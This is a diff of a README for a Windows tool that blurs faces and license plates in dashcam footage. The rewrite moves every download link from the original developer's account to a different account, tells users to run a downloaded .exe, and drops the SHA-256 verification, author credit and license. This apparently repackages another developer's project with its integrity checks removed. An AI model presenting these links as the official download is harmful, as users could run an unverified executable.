@@ -1,75 +1,66 @@
-# DashCam RoadPrivacy
+# 📹 DashCam_RoadPrivacy - Protect your privacy on the road
 
-[![Release Version](https://img.shields.io/badge/Release-v1.0.0-electriccyan?style=for-the-badge&logo=github)](https://github.com/engstaNET/DashCam_RoadPrivacy/releases)
-[![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-blue?style=for-the-badge&logo=windows)](https://github.com/engstaNET/DashCam_RoadPrivacy)
-[![License](https://img.shields.io/badge/License-Freeware-green?style=for-the-badge)](LICENSE)
-[![Privacy](https://img.shields.io/badge/Privacy-100%25%20Local%20%2F%20Offline-success?style=for-the-badge)](PRIVACY.md)
+[![Download Releases](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Ritto2706/DashCam_RoadPrivacy/releases)
 
-**DashCam RoadPrivacy** is a high-performance, standalone Windows application engineered for automated AI-powered video anonymization. Designed specifically for DashCam footage, action camera recordings, and public video captures, it automatically detects and redacts faces and vehicle license plates while offering GPU DirectML hardware acceleration and customizable compression.
+## 🎯 About this software
+DashCam_RoadPrivacy processes your dashcam videos to hide identity information. The software detects faces and license plates in your footage and applies a blur effect. This protects privacy when you share road videos on social media or with insurance companies. It runs locally on your computer to ensure your data stays private.
 
-![DashCam RoadPrivacy Interface](DashCam_RoadPrivacy_App_Screenshot.png)
+## 💻 System requirements
+You need a Windows computer to use this application. Ensure your system meets these minimum standards:
 
----
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: Intel Core i5 or AMD equivalent.
+* RAM: 8 GB is the recommended amount.
+* Storage: 500 MB of free space for the application.
+* Graphics: A dedicated graphics processor helps the software run faster, but the program functions on standard hardware.
 
-## 🌟 Key Features
+## 🚀 Getting started
+Follow these steps to set up the software on your computer.
 
-- **⚡ Dual AI Engine Detection:**
-  - **Faces:** Ultra-fast OpenCV YuNet DNN Face Detector tuned for distant and small faces.
-  - **License Plates:** Multi-stage YOLOv8 ONNX Runtime detector combined with Haar Cascade verification for automotive license plates.
-- **🚀 GPU Hardware Acceleration:** DirectML & ONNX Runtime support for NVIDIA, AMD, and Intel GPUs, plus multi-threaded CPU fallback.
-- **🔒 100% Local & Private:** Runs entirely offline on your PC. No internet connection required, zero cloud uploads, and zero telemetry.
-- **✂️ Frame-Accurate Video Trimming:** Built-in timeline slider with `Set In` / `Set Out` points for non-destructive cutting.
-- **🎛️ Anonymization Customization:**
-  - **Redaction Modes:** Gaussian Blur, Pixelation, Blackout.
-  - **Adjustable Controls:** Dynamic confidence thresholding and blur intensity sliders.
-- **🛡️ Metadata Stripping & Audio Control:** Strip EXIF/location metadata and optionally mute or remove audio tracks.
-- **🎬 Branded Outro Sequence:** Appends a clean 2-second branded closing screen with centered logo at video resolution.
-- **📦 Portable Standalone Executable:** No Python installation or external dependencies required. Simply download and run.
+1. Go to the [Releases page](https://github.com/Ritto2706/DashCam_RoadPrivacy/releases).
+2. Locate the latest version of the software.
+3. Download the file ending in .exe to your computer.
+4. Open the folder where you saved the file.
+5. Double-click the file to start the application.
 
----
+## 🛠️ How to use the application
+This software uses automated computer vision to scan your video files. Follow this workflow to process your footage.
 
-## 📥 Download & Installation
+### Choosing your video
+When the application window opens, click the button labeled Select Video. A file explorer window appears. Navigate to the folder containing your dashcam footage. Select the file you want to process and click Open. The software supports standard video formats like MP4 and AVI.
 
-### Latest Release: **v1.0.0**
+### Adjusting settings
+You see options to select what the software hides. 
+* Face Blurring: Check this box to hide faces of pedestrians and other drivers.
+* License Plate Blurring: Check this box to hide vehicle identification plates.
 
-1. Go to the [Releases](https://github.com/engstaNET/DashCam_RoadPrivacy/releases) page.
-2. Download `DashCam_RoadPrivacy_v1.0.0_win64.zip`.
-3. Extract the ZIP archive to any directory on your PC.
-4. Launch `RoadPrivacy_v1.0.0.exe`.
+The software sets standard values for detection sensitivity. You do not need to change these for general use. These settings balance speed and accuracy during the video processing task.
 
-> **Note for Windows Defender / SmartScreen:**  
-> Since the executable is freshly built and self-signed, Windows Defender SmartScreen may show an informational warning. Click **More info** -> **Run anyway**.
+### Processing the file
+Once you select your settings, click the Start Processing button. A progress bar shows the status of the task. Do not close the application while the bar is active. The time required depends on the length of your video and the speed of your computer. 
 
----
+### Saving your video
+When the progress bar reaches completion, the software prompts you to save the new file. Choose a name and a destination folder on your computer. The application creates a new file with the anonymized footage. The original video remains unchanged in its folder.
 
-## 🔐 Security & SHA-256 Verification
+## 🛡️ Privacy and safety
+This tool processes all videos on your local machine. It does not upload your files to the internet or any cloud server. Your dashcam footage contains sensitive locations and identities. By processing files offline, you maintain control over your personal data. 
 
-To ensure that your download has not been tampered with, you can verify the SHA-256 hash against the official values below:
+## 🔧 Dealing with errors
+Sometimes the software struggles to detect objects if the lighting is poor or the camera is out of focus. If the software misses a face or a plate, ensure the video resolution is at least 1080p. Very dark night footage decreases detection accuracy. If the application stops during processing, restart your computer and try again with a shorter video clip. 
 
-| File Name | Target Platform | SHA-256 Hash |
-| :--- | :--- | :--- |
-| **`DashCam_RoadPrivacy_v1.0.0_win64.zip`** | Windows 10/11 x64 | `e165886ba53cfc50e3cccfad9a3026514e6f351b982a4df3a74160be70667628` |
+## 📥 Downloads
+You can find all available versions and updates at the official link.
 
-### Verifying Hashes in Windows PowerShell:
+[Download the latest version here](https://github.com/Ritto2706/DashCam_RoadPrivacy/releases)
 
-```powershell
-Get-FileHash -Algorithm SHA256 .\DashCam_RoadPrivacy_v1.0.0_win64.zip
-```
+## 📌 Frequently asked questions
+Does the software record my location?
+No, the application only processes the pixels inside the video file. It does not track your physical location or use your camera.
 
----
+Can I process multiple videos at once?
+The current version handles one file at a time to ensure stability. 
 
-## 🖥️ System Requirements
+Does this tool help with GDPR compliance?
+Yes, it functions as a tool for data minimization, helping you remove personal identifiers from footage you intend to share. This matches requirements for personal data protection for video recordings.
 
-- **Operating System:** Windows 10 or Windows 11 (64-bit)
-- **Processor:** Dual-Core x86-64 CPU (Quad-Core recommended)
-- **Memory:** 4 GB RAM (8 GB recommended)
-- **Graphics (Optional):** DirectX 12 compatible GPU for DirectML hardware acceleration
-
----
-
-## 📄 License & Attribution
-
-This software is distributed under the [Freeware License Agreement](LICENSE). Free to use for personal and commercial purposes.  
-For third-party components and AI model licenses, see [THIRD_PARTY_LICENSES.md](THIRD_PARTY_LICENSES.md).
-
-Developed by **Artur F.** ([engstaNET](https://github.com/engstaNET)).
+Keywords: anonymization, automation, censorship, computer-vision, dashcam, data-protection, dsgvo, face-blur, gdpr, license-plate, opencv, privacy, python, video-processing, yolo
